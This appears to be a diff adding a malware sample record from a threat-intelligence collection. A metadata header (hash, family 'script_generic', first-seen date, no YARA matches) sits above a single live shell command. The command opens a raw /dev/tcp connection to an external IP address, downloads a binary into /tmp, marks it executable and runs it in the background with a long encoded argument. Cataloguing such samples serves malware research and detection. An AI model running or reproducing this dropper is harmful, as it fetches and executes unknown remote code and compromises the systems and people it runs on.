@@ -1,0 +1,10 @@
+# sha256: f4326e4aa101954f0ae4c83fce5288b6853087441a41e50aaa847f69497da7d6
+# family: script_generic
+# kind: script
+# size_bytes: 992
+# first_seen: 2026-07-22 06:59:28.787336 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+nohup bash -c "exec 6<>/dev/tcp/8.219.113.182/60147 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/y5d5V4Fsxz && chmod +x /tmp/y5d5V4Fsxz && /tmp/y5d5V4Fsxz 8+dwfL0PCaFgffecivVyZL8PCrdyefGKnPZ5a6EPCbx8fP+IhPd5Zr0eD71rZvaGhul5ar8QDLlofveDgvBoaqEMD7Z8efeDnPZ4ZbUIDr5me+eKnPV5a6EPD7x8ef+AiPF4Y7sJHrd8evaLnPZ8Z6EICLVkePaDh+d8ZaEMDbl8ef6FnP59aLkOD7xlaPOFnPV7ZaEPDr98evSEiPF4Y7sKHrtlZvWBhOl6Yb4QDLtmcvGCg/NwcrcQDL5rZvGLnPV5aLkOD71maPOFnPV7ZaEPD7l8fveIhPd5YroeCrh8evSEnPV4Y6EGC7VkePaAgudwfL0MDKFje/Ocg/NxaLkOD79haPOFnPV7ZKEMDrt8f/aIhPd5YrgeBqFgef6cg/V9fLsNBLliefWAkvN/fL0NCKFgePKcgPZ8aLkOD79haP+cgPZxfLcNEL1jcf2EgvZ7Ya8GEL1geumDh/dmY78HBLliefOCkvZ6ZqEMDbl8efeKnPZ8Y7UIDr5geeeAg/FmYL4HELZjZvaHhv1+Yr4MBq9qf+mDgPdmY7cIEL5nef2EgvZ5Za8PDrx8evWLnPN6fL4IC7VkePaDgudwfL4LDKFlZvWDiv1+Yr4NCK9jevOcgPR+fL4OBqFjcPCIhPd5YroeD79jZvSHnPZ9aqEPCr9ofveDhvBoY74MELZiZvaGhOl5a7gECL9jePSSg/V8fL0MDqFje+mAhvNyZL8PCr1yefCFnPB7fL0NC6FgevaIhPd5ZrseCrh8cPScgfZmYL8MBLliefaDkvN/fL0LCqFheemAgvByZL8PDrufJwLCD3FPgJBK4C11eQ==" &
